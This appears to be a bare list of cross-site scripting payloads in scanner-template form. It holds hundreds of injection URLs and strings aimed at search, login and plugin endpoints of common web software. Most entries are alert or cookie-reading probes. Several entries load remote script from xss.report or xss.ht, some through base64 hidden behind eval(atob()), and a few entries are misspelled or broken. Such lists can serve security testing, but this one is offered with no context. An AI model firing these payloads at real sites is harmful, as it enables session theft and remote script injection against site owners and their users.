+- "{{BaseURL}}/api/search?q=<svg onload=alert('XSS')>"
+- "{{BaseURL}}/api?path=files&id=dfsse%3Cimg%20src%3da%20onerror%3dalert(document.domain)%3Ez1668cyj2pi&revision=%22%22&type=%22thumb%22&command=url&expires=1687785968527"
+- "{{BaseURL}}/appliance/login?login[password]={{randstr}}%22%3E%3Csvg/onload=alert(document.domain)%3E&login[use_curr]=1&login[submit]=Change%20Password"
+- "{{BaseURL}}/ashboard/search?term=<script>alert('XSS')</script>"
+- "{{BaseURL}}/authorize.html#access_token=1122&state=javascript:alert(document.domain)&expires_in=1s"
+- "{{BaseURL}}/avatar_uploader.pages.inc?file=%3Cscript%3Ealert(document.domain)%3C%2Fscript%3E"
+- "{{BaseURL}}/bbs/new.php?darkmode=%22%3E%3Cscript%3Ealert(document.domain)%3C/script%3E"
+- "{{BaseURL}}/bitrix/help/en/index.html?page=javascript:alert('{{randstr}}')"
+- "{{BaseURL}}/bitrixsetup.php?action=UNPACK&filename=<img src='' onerror=alert(document.domain)>"
+- "{{BaseURL}}/blog/wp-login.php?wp_lang=en_US%27%22%20id=x%20tabindex=1%20onfocusin=alert(document.domain)%3E"
+- "{{BaseURL}}/catalog?search=<img src=x onerror=alert('XSS')>"
+- "{{BaseURL}}/catalog?search=<script>alert('XSS')</script>"
+- "{{BaseURL}}/catalog?search=<svg onload=alert('XSS')>"
+- "{{BaseURL}}/comment?text=<script>alert('XSS')</script>"
+- "{{BaseURL}}/comment?text=<svg onload=alert('XSS')>"
+- "{{BaseURL}}/commenttext=<img src=x onerror=alert('XSS')>"
+- "{{BaseURL}}/config/postProcessing/testNaming?pattern=%3Csvg/onload=alert(document.domain)%3E"
+- "{{BaseURL}}/config/postProcessing/testNaming?pattern=<svg/onload=alert('xss')>"
+- "{{BaseURL}}/contact?message=<img src=x onerror=alert('XSS')>"
+- "{{BaseURL}}/contact?message=<script>alrt('XSS')</script>"
+- "{{BaseURL}}/contact?message=<svg onload=alert('XSS')>"
+- "{{BaseURL}}/content/crx/de/setPreferences.jsp;%0A.html?language=en&keymap=<svg/onload=confirm(document.domain);>//a"
+- "{{BaseURL}}/crx/de/setPreferences.jsp;%0A.html?language=en&keymap=<svg/onload=confirm(document.domain);>//a"
+- "{{BaseURL}}/dashboard/search?term=<img src=x onerror=alert('XSS')>"
+- "{{BaseURL}}/dashboard/search?term=<svg onload=alert('XSS')>"
+- "{{BaseURL}}/dat/search?input=<script>alert('XSS')</script>"
+- "{{BaseURL}}/data/search?input=<img src=x onerror=alert('XSS')>"
+- "{{BaseURL}}/data/search?input=<svg onload=alert('XSS')>"
+- "{{BaseURL}}/dochelper?userId=<script>alert({{randstr}})</script>"
+- "{{BaseURL}}/e/ViewImg/index.html?url=javascript:alert(document.domain)"
+- "{{BaseURL}}/endpoint?param=<script>alert('xss')</script>"
+- "{{BaseURL}}/endpoint?param=<script>alert('xss')</script>#"
+- "{{BaseURL}}/endpoint?param=<script>alert('xss')</script>#value"
+- "{{BaseURL}}/endpoint?param=<script>alert('xss')</script>&param2=value"
+- "{{BaseURL}}/endpoint?param=<script>alert('xss')</script>?"
+- "{{BaseURL}}/endpoint?param=<script>alert('xss')</script>?value"
+- "{{BaseURL}}/feedback?content=<img src=x onerror=alert('XSS')>"
+- "{{BaseURL}}/feedback?content=<script>alert('XSS')</script>"
+- "{{BaseURL}}/feedback?content=<svg onload=alert('XSS')>"
+- "{{BaseURL}}/filter/jmol/iframe.php?_USE=%22};alert(1337);//"
+- "{{BaseURL}}/filter/jmol/js/jsmol/php/jsmol.php?call=saveFile&data=%3Cscript%3Ealert(%27XSS%27)%3C/script%3E&mimetype=text/html"
+- "{{BaseURL}}/for-jobseekers/search-jobs?keyword=l9x1q%22onfocus%3D%22alert(document.domain)%22autofocus%3D%22ak5aghi5u9p"
+- "{{BaseURL}}/help/index.jsp?view=%3Cscript%3Ealert(document.cookie)%3C/script%3E"
+- "{{BaseURL}}/help/index.jsp?view=<script>alert(document.cookie)</script>"
+- "{{BaseURL}}/index.php?option=com_jvouchers&controller=catalog-results&task=query&wajx=1&wmjx=1&tmpl=component&type=raw&crtyid=12&trucs[x][search]=gx3vt%20onfocus=alert(document.domain)%20autofocus=%20itkrzsug7w5"
+- "{{BaseURL}}/index.php?page=jobs&category=1&lrw3e%22onmouseover=%22confirm(document.domain)%22style=%22position:absolute%3bwidth:100%25%3bheight:100%25%3btop:0%3bleft:0%3b%22k1n44=1"
+- "{{BaseURL}}/index.php?searchString=<img src=x onerror=alert('XSS')>"
+- "{{BaseURL}}/index.php?searchString=<script>alert('XSS')</script>"
+- "{{BaseURL}}/index.php?searchString=<svg onload=alert('XSS')>"
+- "{{BaseURL}}/inquiry?details=<script>alert('XSS')</script>"
+- "{{BaseURL}}/inquiry?details=<svg onload=alert('XSS')>"
+- "{{BaseURL}}/inquiry?detils=<img src=x onerror=alert('XSS')>"
+- "{{BaseURL}}/iproperty/property-views/all-properties-with-map?filter_keyword=pihil%22onmouseover=%22alert(document.domain)%22style=%22position:absolute;width:100%;height:100%;top:0;left:0;%22f63m4&option=com_iproperty&view=allproperties&ipquicksearch=1"
+- "{{BaseURL}}/items?search=<img src=x onerror=alert('XSS')>"
+- "{{BaseURL}}/items?search=<script>alert('XSS')</script>"
+- "{{BaseURL}}/items?search=<svg onload=aler('XSS')>"
+- "{{BaseURL}}/joomla/greenery_hub/index.php/en/hotels/reservations?location=d2tff&task=hub.search&ordering=score&direction=desc&type_id=0&show=db8ck%22onfocus=%22confirm(document.domain)%22autofocus=%22xwu0k"
+- "{{BaseURL}}/list?query=<img src=x onerror=alert('XSS')>"
+- "{{BaseURL}}/list?query=<script>alert('XSS')</script>"
+- "{{BaseURL}}/list?query=<svg onload=alert('XSS')>"
+- "{{BaseURL}}/login.php/'%3E%3Csvg/onload=alert%60{{randstr}}%60%3E"
+- "{{BaseURL}}/login.php/'%3E%3Csvg/onload=confirm%60xss%60%3E"
+- "{{BaseURL}}/login?q=%27%3E%22%3Csvg%2Fonload=confirm%28%27testing-xss1%27%29%3E&s=%27%3E%22%3Csvg%2Fonload=confirm%28%27testing-xss2%27%29%3E&search=%27%3E%22%3Csvg%2Fonload=confirm%28%27testing-xss3%27%29%3E&id=%27%3E%22%3Csvg%2Fonload=confirm%28%27testing-xss4%27%29%3E&action=%27%3E%22%3Csvg%2Fonload=confirm%28%27testing-xss5%27%29%3E&keyword=%27%3E%22%3Csvg%2Fonload=confirm%28%27testing-xss6%27%29%3E&query=%27%3E%22%3Csvg%2Fonload=confirm%28%27testing-xss7%27%29%3E&page=%27%3E%22%3Csvg%2Fonload=confirm%28%27testing-xss8%27%29%3E&keywords=%27%3E%22%3Csvg%2Fonload=confirm%28%27testing-xss9%27%29%3E&url=%27%3E%22%3Csvg%2Fonload=confirm%28%27testing-xss10%27%29%3E&view=%27%3E%22%3Csvg%2Fonload=confirm%28%27testing-xss11%27%29%3E&cat=%27%3E%22%3Csvg%2Fonload=confirm%28%27testing-xss12%27%29%3E&name=%27%3E%22%3Csvg%2Fonload=confirm%28%27testing-xss13%27%29%3E&key=%27%3E%22%3Csvg%2Fonload=confirm%28%27testing-xss14%27%29%3E&p=%27%3E%22%3Csvg%2Fonload=confirm%28%27testing-xss15%27%29%3E&redirect_uri=%27%3E%22%3Csvg%2Fonload=confirm%28%27testing-xss15%27%29%3E&redirect_url=%27%3E%22%3Csvg%2Fonload=confirm%28%27testing-xss15%27%29%3E"
+- "{{BaseURL}}/login?username=<img src=x onerror=alert('XSS')>"
+- "{{BaseURL}}/login?username=<script>alert('XSS')<script>"
+- "{{BaseURL}}/login?username=<svg onload=alert('XSS')>"
+- "{{BaseURL}}/logout?q=%27%3E%22%3Csvg%2Fonload=confirm%28%27testing-xss1%27%29%3E&s=%27%3E%22%3Csvg%2Fonload=confirm%28%27testing-xss2%27%29%3E&search=%27%3E%22%3Csvg%2Fonload=confirm%28%27testing-xss3%27%29%3E&id=%27%3E%22%3Csvg%2Fonload=confirm%28%27testing-xss4%27%29%3E&action=%27%3E%22%3Csvg%2Fonload=confirm%28%27testing-xss5%27%29%3E&keyword=%27%3E%22%3Csvg%2Fonload=confirm%28%27testing-xss6%27%29%3E&query=%27%3E%22%3Csvg%2Fonload=confirm%28%27testing-xss7%27%29%3E&page=%27%3E%22%3Csvg%2Fonload=confirm%28%27testing-xss8%27%29%3E&keywords=%27%3E%22%3Csvg%2Fonload=confirm%28%27testing-xss9%27%29%3E&url=%27%3E%22%3Csvg%2Fonload=confirm%28%27testing-xss10%27%29%3E&view=%27%3E%22%3Csvg%2Fonload=confirm%28%27testing-xss11%27%29%3E&cat=%27%3E%22%3Csvg%2Fonload=confirm%28%27testing-xss12%27%29%3E&name=%27%3E%22%3Csvg%2Fonload=confirm%28%27testing-xss13%27%29%3E&key=%27%3E%22%3Csvg%2Fonload=confirm%28%27testing-xss14%27%29%3E&p=%27%3E%22%3Csvg%2Fonload=confirm%28%27testing-xss15%27%29%3E&redirect_uri=%27%3E%22%3Csvg%2Fonload=confirm%28%27testing-xss15%27%29%3E&redirect_url=%27%3E%22%3Csvg%2Fonload=confirm%28%27testing-xss15%27%29%3E"
+- "{{BaseURL}}/lucee/lucees3ezf%3cimg%20src%3da%20onerror%3dalert('{{randstr}}')%3elujb7/admin/imgProcess.cfm"
+- "{{BaseURL}}/lucees3ezf%3cimg%20src%3da%20onerror%3dalert('{{randstr}}')%3elujb7/admin/imgProcess.cfm"
+- "{{BaseURL}}/message?text=<img src=x onerror=alert('XSS')>"
+- "{{BaseURL}}/message?text=<script>alert('XSS')</script>"
+- "{{BaseURL}}/message?text=<svg onload=alert('XSS')>"
+- "{{BaseURL}}/mobile-app/v3/?pid=77A89299&isMobile=%20clq95%22%3E%3Cscript%3Ealert(document.domain)%3C/script%3Elb1ra"
+- "{{BaseURL}}/mobile/shop/lg/mispwapurl.php?LGD_OID=%3Cscript%3Ealert(document.domain)%3C/script%3E"
+- "{{BaseURL}}/mod/jitsi/sessionpriv.php?avatar=https%3A%2F%2F{{Hostname}}%2Fuser%2Fpix.php%2F498%2Ff1.jpg&nom=test_user%27)%3balert(document.domain)%3b//&ses=test_user&t=1"
+- "{{BaseURL}}/mod/lti/auth.php?redirect_uri=javascript:alert('{{randstr}}')"
+- "{{BaseURL}}/modules/mod_jvtwitter/jvtwitter.php?id=%22%3E%3Cimg%20src=x%20onerror=prompt(document.domain);%3E"
+- "{{BaseURL}}/news?q=%27%3E%22%3Csvg%2Fonload=confirm%28%27testing-xss1%27%29%3E&s=%27%3E%22%3Csvg%2Fonload=confirm%28%27testing-xss2%27%29%3E&search=%27%3E%22%3Csvg%2Fonload=confirm%28%27testing-xss3%27%29%3E&id=%27%3E%22%3Csvg%2Fonload=confirm%28%27testing-xss4%27%29%3E&action=%27%3E%22%3Csvg%2Fonload=confirm%28%27testing-xss5%27%29%3E&keyword=%27%3E%22%3Csvg%2Fonload=confirm%28%27testing-xss6%27%29%3E&query=%27%3E%22%3Csvg%2Fonload=confirm%28%27testing-xss7%27%29%3E&page=%27%3E%22%3Csvg%2Fonload=confirm%28%27testing-xss8%27%29%3E&keywords=%27%3E%22%3Csvg%2Fonload=confirm%28%27testing-xss9%27%29%3E&url=%27%3E%22%3Csvg%2Fonload=confirm%28%27testing-xss10%27%29%3E&view=%27%3E%22%3Csvg%2Fonload=confirm%28%27testing-xss11%27%29%3E&cat=%27%3E%22%3Csvg%2Fonload=confirm%28%27testing-xss12%27%29%3E&name=%27%3E%22%3Csvg%2Fonload=confirm%28%27testing-xss13%27%29%3E&key=%27%3E%22%3Csvg%2Fonload=confirm%28%27testing-xss14%27%29%3E&p=%27%3E%22%3Csvg%2Fonload=confirm%28%27testing-xss15%27%29%3E&redirect_uri=%27%3E%22%3Csvg%2Fonload=confirm%28%27testing-xss15%27%29%3E&redirect_url=%27%3E%22%3Csvg%2Fonload=confirm%28%27testing-xss15%27%29%3E"
+- "{{BaseURL}}/notes?content=<img src=x onerror=alert('XSS')>"
+- "{{BaseURL}}/notes?content=<svg onload=alert('XSS')>"
+- "{{BaseURL}}/otes?content=<script>alert('XSS')</script>"
+- "{{BaseURL}}/ping/\"><script>alert(1)</script>"
+- "{{BaseURL}}/ping?jd=a'\"><script>alert(1)</script>"
+- "{{BaseURL}}/plugin/sms5/ajax.sms_emoticon.php?arr_ajax_msg=gnuboard<svg+onload=alert(document.domain)>"
+- "{{BaseURL}}/porta/search?keyword=<img src=x onerror=alert('XSS')>"
+- "{{BaseURL}}/portal/search?keyword=<script>alert('XSS')</script>"
+- "{{BaseURL}}/portal/search?keyword=<svg onload=alert('XSS')>"
+- "{{BaseURL}}/post?message=<img src=x onerror=alert('XSS')>"
+- "{{BaseURL}}/post?message=<script>alert('XSS')</script>"
+- "{{BaseURL}}/post?message=<svg onload=alert('XSS')>"
+- "{{BaseURL}}/preview.php/mn71q%22%3E%3Cscript%3Ealert(document.domain)%3C/script%3Ep15vr?cat_id=&p=2"
+- "{{BaseURL}}/preview.php?controller=Load&action=index&catid=moztj%22%3E%3Cscript%3Ealert(document.domain)%3C%2fscript%3Ems3ea&down_up=a"
+- "{{BaseURL}}/products?query=<img src=x onerror=alert'XSS')>"
+- "{{BaseURL}}/products?query=<script>alert('XSS')</script>"
+- "{{BaseURL}}/products?query=<svg onload=alert('XSS')>"
+- "{{BaseURL}}/profile/search?name=<img src=x onerror=alert('XSS')>"
+- "{{BaseURL}}/profile/search?name=<script>alert('XSS')</script>"
+- "{{BaseURL}}/profile/search?name=<svg onoad=alert('XSS')>"
+- "{{BaseURL}}/profile?q=%27%3E%22%3Csvg%2Fonload=confirm%28%27testing-xss1%27%29%3E&s=%27%3E%22%3Csvg%2Fonload=confirm%28%27testing-xss2%27%29%3E&search=%27%3E%22%3Csvg%2Fonload=confirm%28%27testing-xss3%27%29%3E&id=%27%3E%22%3Csvg%2Fonload=confirm%28%27testing-xss4%27%29%3E&action=%27%3E%22%3Csvg%2Fonload=confirm%28%27testing-xss5%27%29%3E&keyword=%27%3E%22%3Csvg%2Fonload=confirm%28%27testing-xss6%27%29%3E&query=%27%3E%22%3Csvg%2Fonload=confirm%28%27testing-xss7%27%29%3E&page=%27%3E%22%3Csvg%2Fonload=confirm%28%27testing-xss8%27%29%3E&keywords=%27%3E%22%3Csvg%2Fonload=confirm%28%27testing-xss9%27%29%3E&url=%27%3E%22%3Csvg%2Fonload=confirm%28%27testing-xss10%27%29%3E&view=%27%3E%22%3Csvg%2Fonload=confirm%28%27testing-xss11%27%29%3E&cat=%27%3E%22%3Csvg%2Fonload=confirm%28%27testing-xss12%27%29%3E&name=%27%3E%22%3Csvg%2Fonload=confirm%28%27testing-xss13%27%29%3E&key=%27%3E%22%3Csvg%2Fonload=confirm%28%27testing-xss14%27%29%3E&p=%27%3E%22%3Csvg%2Fonload=confirm%28%27testing-xss15%27%29%3E&redirect_uri=%27%3E%22%3Csvg%2Fonload=confirm%28%27testing-xss15%27%29%3E&redirect_url=%27%3E%22%3Csvg%2Fonload=confirm%28%27testing-xss15%27%29%3E"
+- "{{BaseURL}}/query?input=<img src=x onerror=alert('XSS')>"
+- "{{BaseURL}}/query?input=<script>alert('XSS')</script>"
+- "{{BaseURL}}/query?input=<svg onload=alert('XSS')>"
+- "{{BaseURL}}/rails/actions?error=ActiveRecord::PendingMigrationError&action=Run%20pending%20migrations&location=%0djavascript:alert(1)//%0aaaaaa"
+- "{{BaseURL}}/register?email=<img src=x onerror=alert('XSS')>"
+- "{{BaseURL}}/register?email=<script>alert('XSS')</script>"
+- "{{BaseURL}}/register?email=<svg onload=alert('XSS')>"
+- "{{BaseURL}}/register?q=%27%3E%22%3Csvg%2Fonload=confirm%28%27testing-xss1%27%29%3E&s=%27%3E%22%3Csvg%2Fonload=confirm%28%27testing-xss2%27%29%3E&search=%27%3E%22%3Csvg%2Fonload=confirm%28%27testing-xss3%27%29%3E&id=%27%3E%22%3Csvg%2Fonload=confirm%28%27testing-xss4%27%29%3E&action=%27%3E%22%3Csvg%2Fonload=confirm%28%27testing-xss5%27%29%3E&keyword=%27%3E%22%3Csvg%2Fonload=confirm%28%27testing-xss6%27%29%3E&query=%27%3E%22%3Csvg%2Fonload=confirm%28%27testing-xss7%27%29%3E&page=%27%3E%22%3Csvg%2Fonload=confirm%28%27testing-xss8%27%29%3E&keywords=%27%3E%22%3Csvg%2Fonload=confirm%28%27testing-xss9%27%29%3E&url=%27%3E%22%3Csvg%2Fonload=confirm%28%27testing-xss10%27%29%3E&view=%27%3E%22%3Csvg%2Fonload=confirm%28%27testing-xss11%27%29%3E&cat=%27%3E%22%3Csvg%2Fonload=confirm%28%27testing-xss12%27%29%3E&name=%27%3E%22%3Csvg%2Fonload=confirm%28%27testing-xss13%27%29%3E&key=%27%3E%22%3Csvg%2Fonload=confirm%28%27testing-xss14%27%29%3E&p=%27%3E%22%3Csvg%2Fonload=confirm%28%27testing-xss15%27%29%3E&redirect_uri=%27%3E%22%3Csvg%2Fonload=confirm%28%27testing-xss15%27%29%3E&redirect_url=%27%3E%22%3Csvg%2Fonload=confirm%28%27testing-xss15%27%29%3E"
+- "{{BaseURL}}/report?description=<img src=x onerror=alert('XSS')>"
+- "{{BaseURL}}/report?description=<script>alert('XSS')</script>"
+- "{{BaseURL}}/report?description=<svg onload=alert('XSS')>"
+- "{{BaseURL}}/request?info=<img src=x onerror=alert('XSS')>"
+- "{{BaseURL}}/request?info=<script>alert('XSS')</script>"
+- "{{BaseURL}}/sap(bD1ydSZjPTAwMA==)/public/bsp/sap/system_public/logon.htm?logonUrl=javascrip%09T:alert(document.domain)"
+- "{{BaseURL}}/search.php?q=%3CScRipT%3Ealert(document.domain);%3C/ScRipT%3E"
+- "{{BaseURL}}/search.php?query=<body onload=alert('XSS')>"
+- "{{BaseURL}}/search.php?query=<img src=x onerror=alert('XSS')>"
+- "{{BaseURL}}/search.php?query=<script>alert('XSS')</script>"
+- "{{BaseURL}}/search.php?query=<svg onload=alert('XSS')>"
+- "{{BaseURL}}/search.php?searchString=<img src=x onerror=alert('XSS')>"
+- "{{BaseURL}}/search.php?searchString=<script>alert('XSS')</script>"
+- "{{BaseURL}}/search.php?searchString=<svg onload=alert('XSS')>"
+- "{{BaseURL}}/search/index.php?query=<img src=x onerror=alert('XSS')>"
+- "{{BaseURL}}/search/index.php?query=<script>alert('XSS')</script>"
+- "{{BaseURL}}/search/index.php?query=<svg onload=alert('XSS')>"
+- "{{BaseURL}}/search?q=%27%3E%22%3Csvg%2Fonload=confirm%28%27testing-xss1%27%29%3E&s=%27%3E%22%3Csvg%2Fonload=confirm%28%27testing-xss2%27%29%3E&search=%27%3E%22%3Csvg%2Fonload=confirm%28%27testing-xss3%27%29%3E&id=%27%3E%22%3Csvg%2Fonload=confirm%28%27testing-xss4%27%29%3E&action=%27%3E%22%3Csvg%2Fonload=confirm%28%27testing-xss5%27%29%3E&keyword=%27%3E%22%3Csvg%2Fonload=confirm%28%27testing-xss6%27%29%3E&query=%27%3E%22%3Csvg%2Fonload=confirm%28%27testing-xss7%27%29%3E&page=%27%3E%22%3Csvg%2Fonload=confirm%28%27testing-xss8%27%29%3E&keywords=%27%3E%22%3Csvg%2Fonload=confirm%28%27testing-xss9%27%29%3E&url=%27%3E%22%3Csvg%2Fonload=confirm%28%27testing-xss10%27%29%3E&view=%27%3E%22%3Csvg%2Fonload=confirm%28%27testing-xss11%27%29%3E&cat=%27%3E%22%3Csvg%2Fonload=confirm%28%27testing-xss12%27%29%3E&name=%27%3E%22%3Csvg%2Fonload=confirm%28%27testing-xss13%27%29%3E&key=%27%3E%22%3Csvg%2Fonload=confirm%28%27testing-xss14%27%29%3E&p=%27%3E%22%3Csvg%2Fonload=confirm%28%27testing-xss15%27%29%3E&redirect_uri=%27%3E%22%3Csvg%2Fonload=confirm%28%27testing-xss15%27%29%3E&redirect_url=%27%3E%22%3Csvg%2Fonload=confirm%28%27testing-xss15%27%29%3E"
+- "{{BaseURL}}/search?q=<img src=x onerror=alert('XSS')>"
+- "{{BaseURL}}/search?q=<script>alert('XSS')</script>"
+- "{{BaseURL}}/search?q=<svg onload=alert('XSS')>"
+- "{{BaseURL}}/search?query=%22%3E%3Cscript%3Ealert(document.domain)%3C/script%3E"
+- "{{BaseURL}}/search?query=<img src=x onerror=alert('XSS')>"
+- "{{BaseURL}}/search?query=<script>alert('XSS')</script>"
+- "{{BaseURL}}/search?query=<svg onload=alert('XSS')>"
+- "{{BaseURL}}/services/search?query=<img src=x onerroralert('XSS')>"
+- "{{BaseURL}}/services/search?query=<script>alert('XSS')</script>"
+- "{{BaseURL}}/services/search?query=<svg onload=alert('XSS')>"
+- "{{BaseURL}}/shop.php?search=%22/%3E%3Cscript%3Ealert(document.domain)%3C/script%3E"
+- "{{BaseURL}}/shop/products?category=cordless-tools&min=1026553%3balert(document.domain)%2f%2f772"
+- "{{BaseURL}}/show_operations.jsp?Fronsetia_WSDL=%22%3E%3Cimg%2Bsrc%3Dx%20onerror%3Dalert(document.domain)%3E"
+- "{{BaseURL}}/signin?user=<img src=x onerrr=alert('XSS')>"
+- "{{BaseURL}}/signin?user=<script>alert('XSS')</script>"
+- "{{BaseURL}}/signin?user=<svg onload=alert('XSS')>"
+- "{{BaseURL}}/signup?email=<img src=x onerror=alert('XSS')>"
+- "{{BaseURL}}/signup?email=<script>alert('XSS')</script>"
+- "{{BaseURL}}/signup?email=<svg onloadalert('XSS')>"
+- "{{BaseURL}}/specification/report.php?q=%22%3E%3Cimg%20src=x%20onerror=prompt(document.domain)%3E"
+- "{{BaseURL}}/status%3E%3Cscript%3Ealert(31337)%3C%2Fscript%3E"
+- "{{BaseURL}}/subscribe?email=<img src=x onerror=alert('XSS')>"
+- "{{BaseURL}}/subscribe?email=<scipt>alert('XSS')</script>"
+- "{{BaseURL}}/subscribe?email=<svg onload=alert('XSS')>"
+- "{{BaseURL}}/system_certmanager.php?act=%22%3E%3Csvg/onload=eval(atob(%27bGV0IHJlcXVlc3REYXRh[...]HsKCQl9KQoJfSkKfSwgMTAwMCk=%27))%3E&id=0"
+- "{{BaseURL}}/test?param=<img src=x onerror=alert('XSS')>"
+- "{{BaseURL}}/test?param=<script>alert('XSS')</script>"
+- "{{BaseURL}}/test?param=<svg onload=alert('XSS')>"
+- "{{BaseURL}}/tests/Zend/Http/Client/_files/testRedirections.php?redirection=3&param=<img/src=x%20onerror=alert(document.domain)>"
+- "{{BaseURL}}/tiki-5.2/tiki-edit_wiki_section.php?type=%22%3E%3Cscript%3Ealert(31337)%3C/script%3E"
+- "{{BaseURL}}/tiki-ajax_services.php?controller=comment&action=list&type=wiki+page&objectId=<script>alert(document.domain)</script>"
+- "{{BaseURL}}/tiki-edit_wiki_section.php?type=%22%3E%3Cscript%3Ealert(31337)%3C/script%3E"
+- "{{BaseURL}}/tiki/tiki-ajax_services.php?controller=comment&action=list&type=wiki+page&objectId=<script>alert(document.domain)</script>"
+- "{{BaseURL}}/topic/e'%22%3E%3Cimg%20src=x%20onerror=alert(2)%3E"
+- "{{BaseURL}}/update?info=<img src=x onerror=alert('XSS')>"
+- "{{BaseURL}}/update?info=<script>alert('XSS')</script>"
+- "{{BaseURL}}/update?info=<svg onload=alert('XSS')>"
+- "{{BaseURL}}/user/search?name=<img src=x onerror=alert('XSS')>"
+- "{{BaseURL}}/user/search?name=<script>alert('XSS')</script>"
+- "{{BaseURL}}/user/search?name=<svg onload=alert('XSS')>"
+- "{{BaseURL}}/vendor/diablomedia/zendframework1-http/tests/Zend/Http/Client/_files/testRedirections.php?redirection=3&param=<img/src=x%20onerror=alert(1)>"
+- "{{BaseURL}}/wp-content/plugins/adaptive-images/adaptive-images-script.php/%3Cimg/src/onerror=alert(document.domain)%3E/?debug=true"
+- "{{BaseURL}}/wp-content/plugins/avchat-3/index_popup.php?movie_param=%3C/script%3E%3Cscript%3Ealert(document.domain)%3C/script%3E&FB_appId=FB_appId%22%3E%3Cscript%3Ealert(document.domain)%3C/script%3E&"
+- "{{BaseURL}}/wp-content/plugins/knr-author-list-widget/knrAuthorListCustomSortSave.php?listItem[]=<script>alert(document.domain)</script>"
+- "{{BaseURL}}/wp-content/plugins/marmoset-viewer/mviewer.php?id=http://</script><svg/onload=alert(%27{{randstr}}%27)>"
+- "{{BaseURL}}/wp-content/plugins/wordfence/lib/diffResult.php?file=%22%3E%3Csvg%2Fonload%3Dalert(1337)%3E"
+- "{{BaseURL}}/wp-content/plugins/wordfence/lib/diffResult.php?file=%27%3E%22%3Csvg%2Fonload=confirm%28%27test%27%29%3E"
+- "{{BaseURL}}/wp-login.php?wp_lang=%20=id=x+type=image%20id=xss%20onfoc%3C!%3Eusin+alert(document.domain)%0c"
+- "{{BaseURL}}/wp/wp-login.php?wp_lang=en_US%27%22%20id=x%20tabindex=1%20on%3C!%3Efocusin=alert(document.domain)>"
+- "{{BaseURL}}/{{rand_base(4)}}<img src=x data'a'onerror=alert(domain)>.childrenlist.html"
+- "{{BaseURL}}?onclick=%27%22%20teste=efx-224&form=%27%22%20teste=efx-225&position=%27%22%20teste=efx-226&json=%27%22%20teste=efx-227&jsonp=%27%22%20teste=efx-228&cron=%27%22%20teste=efx-229&account_id=%27%22%20teste=efx-230&accountID=%27%22%20teste=efx-231&display=%27%22%20teste=efx-232&_csrf=%27%22%20teste=efx-233&csrf=%27%22%20teste=efx-234&signup=%27%22%20teste=efx-235&signout=%27%22%20teste=efx-236&logoff=%27%22%20teste=efx-237&public=%27%22%20teste=efx-238&footer=%27%22%20teste=efx-239&header=%27%22%20teste=efx-240&contact=%27%22%20teste=efx-241&setup=%27%22%20teste=efx-242&migration=%27%22%20teste=efx-243&token=XSS"
+- "{{BaseURL}}request?info=<svg onload=alert('XSS')>"
+- "{{BaseURL}}{{path}}/cmd.php?cmd=template_engine&dn=%27%22()%26%25%3Czzz%3E%3Cscript%3Ealert(document.domain)%3C/script%3E&meth=ajax&server_id=1"
+- '"0nuboard<svg onload=alert(document.domain)>"'
+- '"</script><script>alert(document.domain)</script>'
+- '"></script><script/src=https://just25testing.xss.ht></script>'
+- '"></script><script>alert(document.domain)</script>'
+- '"><body/onload=alert(25)>'
+- '"><button popovertarget=x>Click me</button><input type="hidden" value="y" popover id=x onbeforetoggle=alert(88)>'
+- '"><iframe/src=javascript:alert(25)>'
+- '"><img src onerror=alert(document.domain) x'
+- '"><img src=2 onerror=alert(document.domain)>" method="post">'
+- '"><img src=x id=dmFyIGE9ZG9jdW1lbnQuY3JlYXRlRWxlbWVudCgic2NyaXB0Iik7YS5zcmM9Ii8veHNzLnJlcG9ydC9zL3NoZWxsZWQiO2RvY3VtZW50LmJvZHkuYXBwZW5kQ2hpbGQoYSk7 onerror=eval(atob(this.id))>'
+- '"><input onfocus=eval(atob(this.id)) id=dmFyIGE9ZG9jdW1lbnQuY3JlYXRlRWxlbWVudCgic2NyaXB0Iik7YS5zcmM9Ii8veHNzLnJlcG9ydC9zL3NoZWxsZWQiO2RvY3VtZW50LmJvZHkuYXBwZW5kQ2hpbGQoYSk7 autofocus>'
+- '"><script src=//xss.report/s/shelled></script>'
+- '"><script>alert(/document_domain/)</script>'
+- '"><script>alert(1)</script>'
+- '"><script>alert(document.domain)</script>'
+- '"><script>confirm(25)</script>'
+- '"><script>confirm(document.cookie)</script>'
+- '"><script>confirm(document.domain)</script>'
+- '"><script>javascript:alert(document.cookie)</script>'
+- '"><svg onload=confirm(document.domain)>'
+- '"><svg/onload=confirm(25)>'
+- '"><video><source onerror=eval(atob(this.id)) id=dmFyIGE9ZG9jdW1lbnQuY3JlYXRlRWxlbWVudCgic2NyaXB0Iik7YS5zcmM9Ii8veHNzLnJlcG9ydC9zL3NoZWxsZWQiO2RvY3VtZW50LmJvZHkuYXBwZW5kQ2hpbGQoYSk7>'
+- '"cf_main_cf" src="javascript:alert(1)"'
+- '"hash":"<img src=x onerror=alert(document.domain)>"'
+- '"text":"<img src=x onerror=alert(document.domain)>'
+- '%22%3E%3Cimg%20src%3Dx%20onerror%3Dconfirm(25)%3E'
+- '&\"><script>alert(1)</script>&noheader=true&sp-action'
+- '&a\"><script>alert(1)</script>&extensions='
+- '''"><body/onload=alert(25)>'
+- '''"><iframe src=javascript:alert(25)>'
+- '''"><img src=x onerror=confirm(25)>'
+- '''"><script>confirm(25)</script>'
+- '''"><svg/onload=confirm(25)>'
+- '''>"></title></style></textarea></script><script src=https://xss.report/c/babutesting></script>'
+- '</iframe><svg/onload=alert("{{randstr}}")>'
+- '</script><script>alert(document.domain)</script>'
+- '<a href="/"><script>alert(document.domain)</script>'
+- '<a href="/?itwed"onmouseover="confirm(document.domain)"style='
+- '<body/onload=alert(25)>'
+- '<em style="color: black;"><script>alert(document.domain)</script>'
+- '<form action="javascript:alert'
+- '<iframe src=javascript:alert(25)>'
+- '<iframe/src=javascript:alert(25)>'
+- '<img src="x" data onerror="alert(domain)"/>'
+- '<img src=a onerror=alert("{{randstr}}")>'
+- '<img src=c onerror=alert(8675309)>'
+- '<img src=x onerror="prompt(document.domain)">aaaaaaaaaaaa'
+- '<img src=x onerror=alert(2)>'
+- '<img src=x onerror=alert(document.cookie)>'
+- '<img src=x onerror=alert(document.domain)>&action=edit'
+- '<img src=x onerror=alert(document.domain)>'
+- '<img/src/onerror=alert(document.domain)>'
+- '<img/src=x onerror=alert(document.domain)'
+- '<option value="/en/?{alert(1)}" selected="selected">'
+- '<p>Name: <b></script><script>alert(document.domain)</script></b>'
+- '<script type="text/javascript">'
+- '<script>$.getScript("//xss.report/s/shelled")</script>'
+- '<script>alert(1)</script>'
+- '<script>alert(1337)</script>'
+- '<script>alert(document.domain)</script>" 0="filetype=images"'
+- '<script>alert(document.domain)</script>'
